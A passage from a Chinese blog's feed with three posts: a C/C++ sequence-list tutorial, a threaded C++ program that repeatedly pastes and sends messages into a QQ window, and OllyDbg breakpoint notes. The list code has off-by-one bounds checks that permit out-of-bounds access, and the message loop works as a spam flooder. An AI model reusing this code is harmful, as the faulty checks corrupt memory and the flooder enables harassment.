    <content type="html"><![CDATA[<h1 id="Sequence-List-顺序表算法分析"><a href="#Sequence-List-顺序表算法分析" class="headerlink" title="(Sequence List)顺序表算法分析"></a>(Sequence List)顺序表算法分析</h1><h2 id="一-Struct实现"><a href="#一-Struct实现" class="headerlink" title="一 Struct实现"></a>一 Struct实现</h2><blockquote><p>动态存储分配</p></blockquote><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LIST_INIT_SIZE 100  <span class="comment">//初始化顺序表最大容量</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LISTINCREMENT 10    <span class="comment">//默认增加空间量</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">char</span>* elem;         <span class="comment">//一维数组</span></span><br><span class="line">    <span class="keyword">int</span> length;         <span class="comment">//线性表当前长度</span></span><br><span class="line">    <span class="keyword">int</span> listsize;       <span class="comment">//当前数组容量</span></span><br><span class="line">    <span class="keyword">int</span> incrementsize;  <span class="comment">//增加空间量</span></span><br><span class="line">&#125; SqList;</span><br></pre></td></tr></table></figure></div><blockquote><p>初始化</p></blockquote><p>构造一个空的顺序表L</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InitList_Sq</span><span class="params">(SqList&amp; L, <span class="keyword">int</span> maxsize = LIST_INIT_SIZE, <span class="keyword">int</span> incresize = LISTINCREMENT)</span></span></span><br><span class="line"><span class="function"></span>&#123;                                        <span class="comment">//构建最大容量maxsize的顺序表L</span></span><br><span class="line">    L.elem = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(maxsize * <span class="keyword">sizeof</span>(<span class="keyword">char</span>));  <span class="comment">//申请内存</span></span><br><span class="line">    <span class="keyword">if</span> (!L.elem)</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    L.length = <span class="number">0</span>;</span><br><span class="line">    L.listsize = maxsize;</span><br><span class="line">    L.incrementsize = incresize;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>求表长</p></blockquote><p>返回当前顺序表L元素个数</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ListLength_Sq</span><span class="params">(SqList L)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> L.length;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>查找元素</p></blockquote><p>从第一个元素起，一次和待查找元素e相比较，找到则返回该元素在L中的位序，查找成功；否则返回-1，查找失败。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">LocateElem</span><span class="params">(SqList L, <span class="keyword">char</span> e)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; L.length; i++) &#123;      <span class="comment">//遍历</span></span><br><span class="line">        <span class="keyword">if</span> (L.elem[i] == e)</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>插入元素</p></blockquote><p>假设顺序表中有length个元素，在第i(0&lt;=i&lt;=length)个元素前插入新元素e时，需要将第length-1至第i个位置(共length-i个)依次后移，然后插入e到第i个位置，length加1，返回true。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">ListInsert_Sq</span><span class="params">(SqList&amp; L, <span class="keyword">int</span> i, <span class="keyword">char</span> e)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> j;</span><br><span class="line">    <span class="keyword">if</span> (i &lt; <span class="number">0</span> || i &gt; L.length) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (L.length &gt; L.listsize) &#123;</span><br><span class="line">        L.elem = (<span class="keyword">char</span>*)<span class="built_in">realloc</span>(L.elem, (L.listsize + L.incrementsize) * <span class="keyword">sizeof</span>(<span class="keyword">char</span>));</span><br><span class="line">        <span class="keyword">if</span> (!L.elem)</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        L.listsize += L.incrementsize;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (j = L.length; j &gt; i; j--)      <span class="comment">//后移</span></span><br><span class="line">        L.elem[j] = L.elem[j - <span class="number">1</span>];</span><br><span class="line">    L.elem[i] = e;</span><br><span class="line">    L.length++;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>删除元素</p></blockquote><p>与插入相反，需要删除第i(0&lt;=i&lt;=length)个元素，将第i至第length-1个位置(共length-i个)依次前移，length减1，返回true。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">ListDetect_Sq</span><span class="params">(SqList&amp; L, <span class="keyword">int</span> i, <span class="keyword">char</span>&amp; e)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> j;</span><br><span class="line">    <span class="keyword">if</span> (i &lt; <span class="number">0</span> || i &gt; L.length)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (L.length &lt;= <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    e = L.elem[i];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = i + <span class="number">1</span>; j &lt;= L.length - <span class="number">1</span>; j++)</span><br><span class="line">        L.elem[j - <span class="number">1</span>] = L.elem[j];</span><br><span class="line">    L.length--;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>取元素</p></blockquote><p>直接返回元素，不需要移动</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">GetElem_Sq</span><span class="params">(SqList L, <span class="keyword">int</span> i, <span class="keyword">char</span>&amp; e)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (i &lt; <span class="number">0</span> || i &gt; L.length)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (L.length &lt;= <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    e = L.elem[i];</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>遍历表</p></blockquote><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ListTraverse_Sq</span><span class="params">(SqList L)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; L.length; i++)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; L.elem[i] &lt;&lt; <span class="string">" "</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>释放表</p></blockquote><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DestroyList_Sq</span><span class="params">(SqList&amp; L)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">free</span>(L.elem);</span><br><span class="line">    L.listsize = <span class="number">0</span>;</span><br><span class="line">    L.length = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="二-Vector实现"><a href="#二-Vector实现" class="headerlink" title="二 Vector实现"></a>二 Vector实现</h2><blockquote><p>Vector常用操作</p></blockquote><ol><li><p>push_back 在数组的最后添加一个数据</p></li><li><p>pop_back 去掉数组的最后一个数据</p></li><li><p>at 得到编号位置的数据</p></li><li><p>begin 得到数组头的指针</p></li><li><p>end 得到数组的最后一个单元+1的指针</p></li><li><p>front 得到数组头的引用</p></li><li><p>back 得到数组的最后一个单元的引用</p></li><li><p>max_size 得到vector最大可以是多大</p></li><li><p>capacity 当前vector分配的大小</p></li><li><p>size 当前使用数据的大小</p></li><li><p>resize 改变当前使用数据的大小，如果它比当前使用的大，者填充默认值</p></li><li><p>reserve 改变当前vecotr所分配空间的大小</p></li><li><p>erase 删除指针指向的数据项</p></li><li><p>clear 清空当前的vector</p></li><li><p>rbegin 将vector反转后的开始指针返回(其实就是原来的end-1)</p></li><li><p>rend 将vector反转构的结束指针返回(其实就是原来的begin-1)</p></li><li><p>empty 判断vector是否为空</p></li><li><p>swap 与另一个vector交换数据</p></li></ol><blockquote><p>初始化</p></blockquote><p>只需将顺序表长度置零</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sqlist::init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    len = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>清空 </p></blockquote><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sqlist::clear</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    v.<span class="built_in">clear</span>();</span><br><span class="line">    len = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>判断是否为空</p></blockquote><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">sqlist::is_empty</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (len == <span class="number">0</span>) ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>获取数据</p></blockquote><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">Seqlist_t <span class="title">sqlist::get_elem</span><span class="params">(<span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> v.at(i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>查找数据</p></blockquote><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sqlist::get_locate</span><span class="params">(Seqlist_t e)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">        <span class="keyword">if</span> (e.element == v.at(i).element)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">return</span> (i != len) ? (i) : (<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>在尾部添加数据</p></blockquote><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sqlist::add_back</span><span class="params">(Seqlist_t e)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    v.push_back(e);</span><br><span class="line">    len++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>删除最后一个数据</p></blockquote><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sqlist::delete_back</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    v.pop_back();</span><br><span class="line">    len--;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>指定位置插入数据</p></blockquote><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sqlist::insert_elem</span><span class="params">(Seqlist_t e, <span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    v.insert(v.<span class="built_in">begin</span>() + i, e);</span><br><span class="line">    len++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>删除指定位置数据</p></blockquote><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sqlist::delete_elem</span><span class="params">(<span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    v.erase(v.<span class="built_in">begin</span>() + i);</span><br><span class="line">    len--;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>遍历数据</p></blockquote><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sqlist::traverse</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"The element is "</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; v.at(i).element &lt;&lt; <span class="string">' '</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;Sequence-List-顺序表算法分析&quot;&gt;&lt;a href=&quot;#Sequence-List-顺序表算法分析&quot; class=&quot;headerlink&quot; title=&quot;(Sequence List)顺序表算法分析&quot;&gt;&lt;/a&gt;(Sequence</summary>
        
      
    
    
    
    <category term="Code" scheme="https://kabeor.github.io/categories/Code/"/>
    
    
    <category term="数据结构" scheme="https://kabeor.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
  </entry>
  
  <entry>
    <title>C++调用线程实现QQ消息循环发送</title>
    <link href="https://kabeor.github.io/C++%E8%B0%83%E7%94%A8%E7%BA%BF%E7%A8%8B%E5%AE%9E%E7%8E%B0QQ%E6%B6%88%E6%81%AF%E5%BE%AA%E7%8E%AF%E5%8F%91%E9%80%81/"/>
    <id>https://kabeor.github.io/C++%E8%B0%83%E7%94%A8%E7%BA%BF%E7%A8%8B%E5%AE%9E%E7%8E%B0QQ%E6%B6%88%E6%81%AF%E5%BE%AA%E7%8E%AF%E5%8F%91%E9%80%81/</id>
    <published>2019-04-23T16:00:00.000Z</published>
    <updated>2020-03-16T04:38:49.117Z</updated>
    
    <content type="html"><![CDATA[<h1 id="C-调用线程实现QQ消息循环发送"><a href="#C-调用线程实现QQ消息循环发送" class="headerlink" title="C++调用线程实现QQ消息循环发送"></a>C++调用线程实现QQ消息循环发送</h1><p>##函数原型</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">unsigned long _beginthread(  </span><br><span class="line">             void(_cdecl *start_address)(void *), &#x2F;&#x2F;声明为void (*start_address)(void *)形式  </span><br><span class="line">             unsigned stack_size, &#x2F;&#x2F;是线程堆栈大小，一般默认为0  </span><br><span class="line">             void *arglist &#x2F;&#x2F;向线程传递的参数，一般为结构体</span><br><span class="line">           ); </span><br><span class="line"></span><br><span class="line">unsigned long _beginthreadex( &#x2F;&#x2F;推荐使用   </span><br><span class="line">             void *security,&#x2F;&#x2F;安全属性，NULL表示默认安全性  </span><br><span class="line">             unsigned stack_size, &#x2F;&#x2F;是线程堆栈大小，一般默认为0  </span><br><span class="line">             unsigned(_stdcall  *start_address)(void *),&#x2F;&#x2F;声明为unsigned(*start_address)(void *)形式  </span><br><span class="line">             void *argilist,&#x2F;&#x2F;向线程传递的参数，一般为结构体  </span><br><span class="line">             unsigned initflag, &#x2F;&#x2F;新线程的初始状态，0表示立即执行，CREATE_SUSPEND表示创建后挂起。  </span><br><span class="line">             unsigned *thrdaddr &#x2F;&#x2F;该变量存放线程标识符，它是CreateThread函数中的线程ID。); &#x2F;&#x2F;创建成功条件下的将线程句柄转化为unsigned long型返回，创建失败条件下返回0</span><br></pre></td></tr></table></figure></div><blockquote><p>使用_beginthreadex而不是CreateThread的原因</p></blockquote><p> _beginthreadex在内部调用了CreateThread，在调用之前_beginthreadex做了很多的工作，从而使得它比CreateThread更安全。</p><p>通常建议使用_beginthreadex函数，而不是CreateThread函数，这使得线程中的代码不需要考虑C/C++代码的线程安全性，除非你清楚地知道在新的线程中不会调用到线程不安全的C/C++代码，这时候放心地使用CreateThread也无可厚非(实际上这种情况很难判定)。_beginthreadex保证了某些C/C++运行库代码的线程安全性，而CreateThread没有对这些特殊的C/C++代码做出保证，这里再次强调这两个函数的区别。不要含糊地认为CreateThread的设计存在缺陷，CreateThread的功能并不专门针对于C/C++运行库，理所当然不必为其多线程安全性而负责。</p><p>##实现</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;process.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> _stdcall <span class="title">ThreadOne</span><span class="params">(<span class="keyword">void</span>* Parg)</span>                   <span class="comment">//stdcall自动平衡堆栈</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">"输入发送次数"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">int</span> j;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; j;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span> ; i &lt; j; i++)</span><br><span class="line">&#123;</span><br><span class="line">SendMessage((HWND)<span class="number">0x002401E8</span>, WM_PASTE, <span class="number">0</span>, <span class="number">0</span>);    <span class="comment">//获取窗口线程   获取剪切板内容</span></span><br><span class="line">        Sleep(<span class="number">300</span>);</span><br><span class="line">keybd_event(VK_RETURN, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);                  <span class="comment">//模拟按下回车</span></span><br><span class="line">keybd_event(VK_RETURN, <span class="number">0</span>, KEYEVENTF_KEYUP, <span class="number">0</span>);    <span class="comment">//模拟弹起回车</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">_beginthreadex(<span class="literal">NULL</span>,<span class="literal">NULL</span>,ThreadOne,<span class="number">0</span>,<span class="literal">NULL</span>,<span class="number">0</span>);        <span class="comment">//线程调用</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">"输入发送次数"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;C-调用线程实现QQ消息循环发送&quot;&gt;&lt;a href=&quot;#C-调用线程实现QQ消息循环发送&quot; class=&quot;headerlink&quot;</summary>
        
      
    
    
    
    <category term="Code" scheme="https://kabeor.github.io/categories/Code/"/>
    
    
    <category term="C++多线程" scheme="https://kabeor.github.io/tags/C-%E5%A4%9A%E7%BA%BF%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>OD常用断点</title>
    <link href="https://kabeor.github.io/OD%E5%B8%B8%E7%94%A8%E6%96%AD%E7%82%B9/"/>
    <id>https://kabeor.github.io/OD%E5%B8%B8%E7%94%A8%E6%96%AD%E7%82%B9/</id>
    <published>2019-03-19T16:00:00.000Z</published>
    <updated>2020-03-16T04:46:41.170Z</updated>
    
    <content type="html"><![CDATA[<h1 id="OD常用断点"><a href="#OD常用断点" class="headerlink" title="OD常用断点"></a>OD常用断点</h1><h2 id="INT-3断点"><a href="#INT-3断点" class="headerlink" title="INT 3断点"></a>INT 3断点</h2><blockquote><p>原理： 当执行一个INT 3断点时，该地址处的内容被调试器用INT 3 指令替换，此时OD将INT 3隐藏，显示中断前的指令</p></blockquote><blockquote><p>INT 3机器码为0xCC<br>   <code>004013A5  CC D0404000</code><br>68被替换为CC</p></blockquote><p>INT3断点可设置无限个，但改变了程序机器码，容易被检测，如检测API首地址是否为0xCC。绕过方式，将断点设在函数内部或末尾。</p><p>F2或命令行 bp设置</p><h2 id="硬件断点"><a href="#硬件断点" class="headerlink" title="硬件断点"></a>硬件断点</h2><blockquote><p>原理<br>与DRx调试寄存器有关</p></blockquote><blockquote><p>Dr0~3用于设置硬件断点，即在调试器中经常使用的bpm断点，由于只有4个断点寄存器，所以最多只能设置4个bpm断点。Dr7是一些控制位，用于控制断点的方式，Dr6用于显示是哪些引起断点的原因。</p></blockquote><p><a href="https://i.loli.net/2019/02/14/5c64ea4e1430a.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/02/14/5c64ea4e1430a.jpg" class="lazyload"></a></p><p>硬件断点不会将指令首字节修改为CC</p><p>菜单Breakpoint  &gt; hardware,on execution 或命令行 “HE 地址”设置</p><h2 id="内存断点"><a href="#内存断点" class="headerlink" title="内存断点"></a>内存断点</h2><blockquote><p>原理： 对所设的地址赋予不可访问/不可写入属性，当访问或写入时会产生异常，OD截获异常后比较是否是断点地址，如果是就中断。</p></blockquote><p>只能下一个内存断点<br>Breakpoint &gt; memory, on write/access设置，F9运行</p><p>硬件访问/写入断点在触发硬件断点的下一条指令处下断，内存断点在触发断点的指令处下断。</p><h2 id="内存访问一次性断点"><a href="#内存访问一次性断点" class="headerlink" title="内存访问一次性断点"></a>内存访问一次性断点</h2><p>ALT+M显示内存，在相应段上右键Set break-on-access或F2对整个内存块设置该类断点<br>这个断点是一次性断点，当所在段被读取或执行时中断，然后断点被删除</p><p>捕捉调用或返回某模块时使用。</p><h2 id="消息断点"><a href="#消息断点" class="headerlink" title="消息断点"></a>消息断点</h2><p>当某个特定窗口函数接收到特定消息时，消息断点将使程序中断。<br>INT 3断点可在程序启动前设置，消息断点只能在窗口被创建后设置并拦截消息。</p><p>运行窗口程序，菜单View &gt; Windows或W按钮，列出窗口相关参数，右键Actualize刷新。对应位置右键Message breakpoint on ClassProc进行设置。想要返回程序领空，应对.text段下内存访问断点。</p><h2 id="条件断点"><a href="#条件断点" class="headerlink" title="条件断点"></a>条件断点</h2><h3 id="寄存器条件中断"><a href="#寄存器条件中断" class="headerlink" title="寄存器条件中断"></a>寄存器条件中断</h3><p>Shift+F2</p><h3 id="存储器条件中断"><a href="#存储器条件中断" class="headerlink" title="存储器条件中断"></a>存储器条件中断</h3><p>标出各参数对应ESP地址 栈窗口右键Address &gt; Relative to ESP</p><p>相应API用Shift+F2设置断点</p><h3 id="条件记录断点"><a href="#条件记录断点" class="headerlink" title="条件记录断点"></a>条件记录断点</h3><p>Shift+F4</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;OD常用断点&quot;&gt;&lt;a href=&quot;#OD常用断点&quot; class=&quot;headerlink&quot; title=&quot;OD常用断点&quot;&gt;&lt;/a&gt;OD常用断点&lt;/h1&gt;&lt;h2 id=&quot;INT-3断点&quot;&gt;&lt;a href=&quot;#INT-3断点&quot; class=&quot;headerlink&quot;</summary>
        
      
    
    
    
    <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
    <category term="逆向" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>第15章  对抗反汇编</title>
    <link href="https://kabeor.github.io/%E7%AC%AC15%E7%AB%A0%20%20%E5%AF%B9%E6%8A%97%E5%8F%8D%E6%B1%87%E7%BC%96/"/>
    <id>https://kabeor.github.io/%E7%AC%AC15%E7%AB%A0%20%20%E5%AF%B9%E6%8A%97%E5%8F%8D%E6%B1%87%E7%BC%96/</id>
    <published>2019-02-13T16:00:00.000Z</published>
    <updated>2020-03-16T04:26:24.102Z</updated>
    
